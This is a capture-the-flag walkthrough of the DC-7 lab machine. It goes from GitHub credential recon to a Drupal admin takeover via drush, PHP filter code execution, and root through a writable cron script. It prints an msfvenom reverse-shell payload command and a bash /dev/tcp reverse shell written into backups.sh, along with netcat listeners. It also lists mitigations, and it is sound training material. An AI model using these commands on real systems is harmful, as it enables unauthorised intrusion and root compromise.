# DC-7 — Walkthrough

| Field | Detail |
|---|---|
| Machine | DC-7 |
| Series | DC |
| Author | DCAU |
| Release Date | 31 Aug 2019 |
| Difficulty | Medium |
| OS | Linux |

## 🔍 Overview

DC-7 is a Linux machine involving OSINT/GitHub reconnaissance to uncover hardcoded credentials, SSH access, Drupal admin takeover via `drush`, remote code execution through a PHP module upload, and privilege escalation via a writable cron script running as root.

**Machine Details**

- Target IP: `192.168.1.14`
- Attacker (Kali) IP: `192.168.1.10`

---

## Step 1 – Network Scanning

```bash
nmap -T4 -A -p- 192.168.1.14
```

**Open Ports:**

| Port | Service |
|---|---|
| 22/tcp | SSH — OpenSSH 7.4p1 |
| 80/tcp | Apache httpd 2.4.25 (Drupal 8) |
| 443/tcp | HTTPS |

---

## Step 2 – Web Enumeration

Visited `http://192.168.1.14` and found hints pointing toward external reconnaissance, including a possible username: `@DC7USER`.

---

## Step 3 – Footprinting @DC7USER

Searched for the username online and found a public GitHub account containing a repository named `staffdb` (a PHP project), which included a `config.php` file with hardcoded credentials.

---

## Step 4 – Extract Credentials from GitHub

**Found in `config.php`:**

```
Username: dc7user
Password: <recovered from public repo>
```

---

## Step 5 – SSH Login

```bash
ssh-keygen -f '/root/.ssh/known_hosts' -R '192.168.1.14'
ssh dc7user@192.168.1.14
```

**Result:** Successfully authenticated as `dc7user`.

---

## Step 6 – Post-Exploitation Enumeration

```bash
cat /home/dc7user/mbox
```

**Found:** A local mail message referencing a cron job that runs `/opt/scripts/backups.sh`, which uses `drush` (the Drupal shell/CLI tool).

---

## Step 7 – Review backups.sh

```bash
cat /opt/scripts/backups.sh
```

**Result:** The script uses `drush` to perform database backups and runs as `root` via cron.

---

## Step 8 – Reset Drupal Admin Password via Drush

```bash
drush user-password admin --password=<new_password>
```

Since `drush` was accessible, the Drupal site's admin password was reset directly from the command line.

---

## Step 9 – Login to Drupal

Logged into the Drupal admin panel (`/user/login`) using the newly reset `admin` credentials.

---

## Step 10 – Install the PHP Module

1. Navigate to **Manage → Extend → Install new module**
2. Download and upload the PHP filter module (`drupal.org/project/php`)
3. Install the module

---

## Step 11 – Enable PHP Filter

1. Go to **Manage → Extend → Filters**
2. Enable the **PHP filter** checkbox
3. Save

---

## Step 12 – Set Up a Reverse Shell Listener

```bash
nc -lvnp 4444
```

---

## Step 13 – Create a Drupal Node with PHP Code

1. Go to **Content → Add content → Basic page**
2. Set the body's **Text format** to **PHP**
3. Insert a PHP reverse shell payload (Pentest Monkey-style) targeting the Kali listener
4. Preview the page to trigger execution

---

## Step 14 – Receive the Reverse Shell

The netcat listener received an incoming connection as `www-data`.

---

## Step 15 – Upgrade to an Interactive Shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Step 16 – Check File Permissions

```bash
ls -la /opt/scripts/backups.sh
```

**Result:** `www-data` had write permissions on the script — and it runs as `root` via cron.

---

## Step 17 – Generate a Payload

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=5555 -f elf > shell
```

---

## Step 18 – Modify backups.sh for Privilege Escalation

```bash
cat > /opt/scripts/backups.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/192.168.1.10/5555 0>&1
EOF
```

The writable, root-executed cron script was overwritten with a reverse shell payload.

---

## Step 19 – Set Up the Root Shell Listener

```bash
nc -lvnp 5555
```

---

## Step 20 – Wait for Cron Execution

The cron job runs `backups.sh` every 15 minutes as root, triggering the reverse shell back to the listener.

---

## Step 21 – Flag Capture

```bash
whoami
id
cd /root
ls
cat flag.txt
```

✅ **Root flag captured — machine fully compromised.**

---

## 🛡️ Key Vulnerabilities Identified

1. Information disclosure via a username hint leading to OSINT/GitHub reconnaissance
2. Hardcoded credentials committed to a public GitHub repository
3. Weak exposure of SSH credentials derived from source code
4. `drush` access allowed direct admin password reset without proper authorization checks
5. Unrestricted Drupal module installation enabling PHP code execution
6. Writable cron script (`backups.sh`) executed as root, enabling full privilege escalation

## 🩹 Mitigations

1. Never commit credentials or secrets to source control, public or private
2. Use SSH key-based authentication instead of passwords
3. Restrict Drupal module installation to trusted administrators only
4. Disable or tightly control PHP code execution modules in production CMS environments
5. Restrict write permissions on scripts executed by cron, especially those running as root
6. Regularly audit file permissions and cron job configurations
7. Deploy a Web Application Firewall (WAF)

---

## 🧰 Tools Used

`nmap` · `git`/GitHub OSINT · `ssh` · `drush` · Drupal PHP filter module · `netcat` · `msfvenom` · `python (pty)`

## 🧠 Techniques Covered

OSINT / GitHub reconnaissance · SSH authentication · Drupal admin takeover via drush · PHP module installation · Remote code execution · Reverse shell handling · Cron job abuse · Privilege escalation

---

## Summary

| Step | Description | Status |
|---|---|---|
| 1 | Network Scanning | ✅ |
| 2 | Web Enumeration | ✅ |
| 3 | Footprinting @DC7USER | ✅ |
| 4 | Extract Credentials from GitHub | ✅ |
| 5 | SSH Login | ✅ |
| 6 | Post-Exploitation Enumeration | ✅ |
| 7 | Review backups.sh | ✅ |
| 8 | Reset Drupal Admin Password via Drush | ✅ |
| 9 | Login to Drupal | ✅ |
| 10 | Install the PHP Module | ✅ |
| 11 | Enable PHP Filter | ✅ |
| 12 | Set Up Reverse Shell Listener | ✅ |
| 13 | Create Drupal Node with PHP Code | ✅ |
| 14 | Receive the Reverse Shell | ✅ |
| 15 | Upgrade to Interactive Shell | ✅ |
| 16 | Check File Permissions | ✅ |
| 17 | Generate a Payload | ✅ |
| 18 | Modify backups.sh for Privilege Escalation | ✅ |
| 19 | Set Up Root Shell Listener | ✅ |
| 20 | Wait for Cron Execution | ✅ |
| 21 | Flag Capture | ✅ |

*Writeup for educational purposes. Machine solved as part of the "DC" series.*
